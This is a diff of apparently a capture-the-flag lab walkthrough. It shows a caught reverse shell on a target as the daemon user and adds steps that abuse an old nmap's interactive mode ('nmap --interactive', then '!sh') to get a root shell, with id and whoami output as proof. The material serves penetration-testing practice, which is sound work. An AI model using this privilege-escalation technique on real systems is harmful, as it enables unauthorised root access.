@@ -641,5 +641,18 @@ connect to [10.10.16.2] from (UNKNOWN) [10.10.10.3] 57777
 id
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 
-# from t
+
+#################################################################################
+
+
+# from the initial recon, this target machine has nmap installed and its version also has a known vuln thus let's use it as our leverage to perform privilege escalation to become root from daemon
+# run nmap in interactive mode
+nmap --interactive
+# at nmap> prompt, type !sh
+nmap> !sh
+# now it pops the shell as root
+id
+uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
+whoami
+root
 ```
